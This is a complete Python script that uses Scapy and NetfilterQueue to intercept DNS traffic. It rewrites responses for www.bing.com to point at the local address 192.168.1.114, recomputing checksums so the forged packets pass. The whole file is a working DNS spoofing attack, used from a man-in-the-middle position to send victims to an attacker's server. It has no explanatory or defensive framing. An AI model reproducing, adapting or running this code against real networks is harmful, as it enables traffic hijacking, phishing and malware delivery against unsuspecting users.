#!/usr/bin/env python3

import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    # Convert the packet payload to a Scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet has a DNS response layer
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # Decode to convert bytes to a string
        if "www.bing.com" in qname:
            print("[+] Spoofing target")

            # Craft the spoofed DNS response
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.114")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Delete length and checksum fields to let Scapy recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set the modified payload
            packet.set_payload(bytes(scapy_packet))

    # Accept the packet
    packet.accept()


# Bind the queue and process packets
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
